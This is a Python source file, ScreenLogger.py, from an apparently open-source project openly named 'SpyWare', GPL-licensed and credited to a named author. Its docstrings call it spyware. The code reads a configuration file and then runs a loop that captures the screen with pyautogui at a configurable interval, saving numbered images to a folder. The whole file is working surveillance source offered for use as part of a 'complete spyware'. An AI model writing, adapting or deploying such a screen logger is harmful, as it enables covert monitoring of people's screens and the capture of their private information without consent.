#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file implements a SpyWare to capture the screen.
#    Copyright (C) 2021, 2022  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This file implements a SpyWare to capture the screen.

~# python3 ScreenLogger.py screenSpy.conf

>>> from os import environ
>>> environ['screenSpy.conf'] = 'screenSpy.conf'
>>> from SpyWare.ScreenLogger import screenSpy
>>> screenSpy()                  # (using env) OR
>>> screenSpy('screenSpy.conf')  # (using config file name) OR
>>> screenSpy(argv=["ScreenLogger.py", "screenSpy.conf"]) # (using argv)
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This file implements a complete spyware.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["Daemon", "main", "config_load"]

from os.path import join, dirname, exists
from configparser import ConfigParser
from pyautogui import screenshot
from os import makedirs, environ
from sys import argv, exit
from typing import List
from time import sleep
from glob import glob


class CONFIGURATIONS:

    """
    This class contains configurations.
    """

    save_filename: str = "screenshot*.png"
    save_dirname: str = "screenshots"
    screenshot_interval: int = 3600


def config_load(filename: str = None, argv: List[str] = argv) -> int:

    """
    This function loads the configuration using a the configuration file.
    """

    CONFIG = ConfigParser()
    default_file_name = "screenSpy.conf"

    default_file_path = join(dirname(__file__), default_file_name)
    env_config_file = environ.get(default_file_name)
    arg_config_file = argv[1] if len(argv) == 2 else None

    if filename is not None and exists(filename):
        CONFIG.read(filename)
    elif arg_config_file is not None and exists(arg_config_file):
        CONFIG.read(arg_config_file)
    elif env_config_file and exists(env_config_file):
        CONFIG.read(env_config_file)
    elif exists(default_file_path):
        CONFIG.read(default_file_path)
    else:
        return 1

    CONFIG = CONFIG.__dict__["_sections"]
    CONFIGURATIONS.save_filename = CONFIG.get("SAVE", {}).get(
        "filename", "screenshot*.png"
    )
    CONFIGURATIONS.save_dirname = CONFIG.get("SAVE", {}).get(
        "dirname", "screenshots"
    )
    CONFIGURATIONS.screenshot_interval = float(
        CONFIG.get("TIME", {}).get("screenshot_interval", "3600")
    )
    return 0


class Daemon:

    """
    This class implements a loop to capture screen
    while the spyware is running.
    """

    def __init__(self):
        self.interval = CONFIGURATIONS.screenshot_interval
        self.run = True
        path = self.path = join(
            CONFIGURATIONS.save_dirname, CONFIGURATIONS.save_filename
        )
        self.increment = len(glob(path))

    def run_for_ever(self) -> None:

        """
        This function takes the screenshot and sleep in a loop.
        """

        makedirs(CONFIGURATIONS.save_dirname, exist_ok=True)
        increment = self.increment
        interval = self.interval

        while self.run:
            screenshot(self.path.replace("*", str(increment)))
            increment += 1
            if self.run:
                sleep(interval)


def main(config_filename: str = None, argv: List[str] = argv) -> int:

    """
    This function executes this script from the command line.
    """

    config_load(filename=config_filename, argv=argv)

    daemon = Daemon()

    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False

    return 0


if __name__ == "__main__":
    print(copyright)
    exit(main())
